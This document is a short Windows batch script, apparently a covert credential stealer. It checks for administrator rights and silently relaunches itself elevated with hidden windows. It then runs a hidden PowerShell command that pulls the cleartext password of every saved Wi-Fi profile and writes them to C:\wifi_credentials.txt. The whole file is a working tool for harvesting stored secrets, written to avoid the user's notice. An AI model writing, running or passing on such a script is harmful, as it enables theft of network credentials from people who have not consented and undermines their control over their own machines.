@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    powershell -WindowStyle Hidden -Command "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {$name = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name=$name key=clear | Select-String 'Key Content'); if($pass) {$passValue = ($pass -split ':')[1].Trim()} else {$passValue = 'No password or access denied'}; Write-Output \"$name : $passValue\"} | Out-File C:\wifi_credentials.txt -Encoding utf8"
    exit /b
) else (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
